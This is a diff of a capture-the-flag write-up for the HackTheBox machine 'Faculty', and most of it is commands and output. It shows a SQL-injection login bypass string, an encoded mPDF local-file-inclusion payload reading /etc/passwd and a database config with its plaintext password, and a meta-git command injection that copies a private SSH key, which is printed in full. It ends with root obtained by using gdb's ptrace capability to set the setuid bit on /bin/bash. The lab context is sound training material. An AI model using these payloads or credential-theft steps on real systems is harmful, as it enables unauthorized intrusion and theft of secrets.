@@ -1,4 +1,8 @@
 
+### Tools: feroxbuster, gdb
+
+### Vulnerabilities: SQLI Auth bypass, PDF LFI, Sudo: Meta-Git, GDB attach process/cap_sys_ptrace
+
 ```
 └─$ nmap -A -p- -T4 -Pn faculty.htb 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-30 10:47 CDT
@@ -26,7 +30,7 @@ Nmap done: 1 IP address (1 host up) scanned in 18.10 seconds
 ```
 
 
-
+```console
 ─$ feroxbuster -u http://faculty.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q
 302      GET      359l      693w        0c http://faculty.htb/ => login.php
 301      GET        7l       12w      178c http://faculty.htb/admin => http://faculty.htb/admin/
@@ -96,12 +100,32 @@ Nmap done: 1 IP address (1 host up) scanned in 18.10 seconds
 200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/meter.php
 200      GET        0l        0w        0c http://faculty.htb/mpdf/mpdf.php
 200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/myanmar.php
-
+```
 
 http://faculty.htb/admin/login.php
 
-'or'1=1#
-'or'1=1#
+admin'or'1=1#
+admin'or'1=1#
+
+
+Using this string from the exploit linked below and inputting it into burp we can read local files.
+
+Also it is needed to be URL encoded twice and then base64 encoded. This can be confirmed by taking the original pdf file code and decoding it.
+
+This can be done multiple ways but I will explain it with burpsuite.
+
+Take the pdf string and throw it into the decoder.
+
+Next decode as base64, then url decode, then url decode again to get a plain text string from the pdf.
+
+
+
+```<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />```
+
+```JTI1JTMzJTYzJTI1JTM2JTMxJTI1JTM2JTY1JTI1JTM2JTY1JTI1JTM2JTY2JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMyJTMwJTI1JTM2JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTM2JTM1JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTM5JTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM0JTM3JTI1JTM3JTMyJTI1JTM2JTMxJTI1JTM3JTMwJTI1JTM2JTM4JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM3JTM0JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM0JTMxJTI1JTM3JTM0JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM2JTMzJTI1JTM2JTM4JTI1JTM2JTM1JTI1JTM2JTM0JTI1JTMyJTMwJTI1JTM0JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTYxJTI1JTMyJTMwJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTMwJTI1JTM2JTY2JTI1JTM3JTMzJTI1JTMyJTY0JTI1JTM3JTM4JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMzJTMxJTI1JTMzJTM5JTI1JTMzJTM1JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTMyJTY2JTI1JTMzJTY1```
+
+
+https://www.exploit-db.com/exploits/50995
 
 
 
@@ -126,14 +150,14 @@ pdf=JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyL2V0Yy9wYXNzd2QlMjUyMiUyNTIwY29udGVu
 
 http://faculty.htb/mpdf/tmp/OKQVoYJgi9AqWEu045DZNwdzfX.pdf
 
-
+```php
 └─$ cat db_connect.php 
 <?php 
 
 $conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
-                    
+ ```                   
 
-
+```console
 └─$ ssh gbyolo@faculty.htb          
 The authenticity of host 'faculty.htb (10.129.251.2)' can't be established.
 ED25519 key fingerprint is SHA256:JYKRgj5yk9qD3GxSCsRAgUIBAhmTssq961F3rHxWlnY.
@@ -167,12 +191,26 @@ To check for new updates run: sudo apt update
 
 You have mail.
 gbyolo@faculty:~$ 
+```
+
+
+```console
+gbyolo@faculty:/tmp$ sudo -l
+[sudo] password for gbyolo: 
+Matching Defaults entries for gbyolo on faculty:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User gbyolo may run the following commands on faculty:
+    (developer) /usr/local/bin/meta-git
+
 
 https://hackerone.com/reports/728040
+
 ```
 gbyolo@faculty:/tmp$ sudo -u developer /usr/local/bin/meta-git clone 'sss||cat /home/developer/.ssh/id_rsa > /tmp/id_rsa'
 meta git cloning into 'sss||cat /home/developer/.ssh/id_rsa > /tmp/id_rsa' at id_rsa
 ```
+
 
 
 ```
@@ -214,4 +252,78 @@ LETXujOl8CFiHvMA1Zf6eriE1/Od3JcUKiHTwv19MwqHitxUcNW0sETwZ+FAHBBuc2NTVF
 YEeVKoox5zK4lPYIAgGJvhUTzSuu0tS8O9bGnTBTqUAq21NF59XVHDlX0ZAkCfnTW4IE7j
 9u1fIdwzi56TWNhQAAABFkZXZlbG9wZXJAZmFjdWx0eQ==
 -----END OPENSSH PRIVATE KEY-----
+
+```
+```console
+developer@faculty:/tmp$ id
+uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)
+```
+
+Linpeas revealed that gdb has cap_sys_ptrace capability.
+
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace
+
+```console
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                    
+Current env capabilities:                                                                                                                          
+Current: =
+Current proc capabilities:
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+
+Parent Shell capabilities:
+0x0000000000000000=
+
+Files with capabilities (limited to 50):
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/gdb = cap_sys_ptrace+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+```
+
+```console
+developer@faculty:/tmp$ ps faux | grep /usr/bin
+root         650  0.0  0.5  46324 10724 ?        Ss   21:22   0:00 /usr/bin/VGAuthService
+root         658  0.2  0.4 236540  8464 ?        Ssl  21:22   0:04 /usr/bin/vmtoolsd
+message+     689  0.0  0.2   7576  4708 ?        Ss   21:22   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+develop+   35172  0.0  0.0   5192   724 pts/0    S+   21:58   0:00  |           \_ grep --color=auto /usr/bin
+develop+    8932  0.0  0.1  79980  3348 ?        SLs  21:25   0:00  \_ /usr/bin/gpg-agent --supervised
+```
+
+```console
+(gdb) attach 689
+Attaching to program: /usr/bin/python3.8, process 689
+Reading symbols from /lib64/ld-linux-x86-64.so.2...
+Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug...
+0x00007f4041a3e42a in _start () from /lib64/ld-linux-x86-64.so.2
+(gdb) call system("chmod u+s /bin/bash")
+'system@plt' has unknown return type; cast the call to its declared return type
+(gdb) call (void)system("chmod u+s /bin/bash")
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x00007f4041a5a7cb in malloc (n=20) at dl-minimal.c:49
+49      dl-minimal.c: No such file or directory.
+The program being debugged was signaled while in a function called from GDB.
+GDB remains in the frame where the signal was received.
+To change this behavior use "set unwindonsignal on".
+Evaluation of the expression containing the function
+(malloc) will be abandoned.
+When the function is done executing, GDB will silently stop.
+(gdb) 
+
+```
+```console
+developer@faculty:/tmp$ bash -p
+bash-5.0# id
+uid=1001(developer) gid=1002(developer) euid=0(root) groups=1002(developer),1001(debug),1003(faculty)
+bash-5.0# cat /home/developer/user.txt
+a22c5515a2ea18c17fb5b1f8813862d5
+bash-5.0# cat /root/root.txt
+bcfcab15acf5a06f8dc1ee7c5a7769a0
+bash-5.0# 
 ```
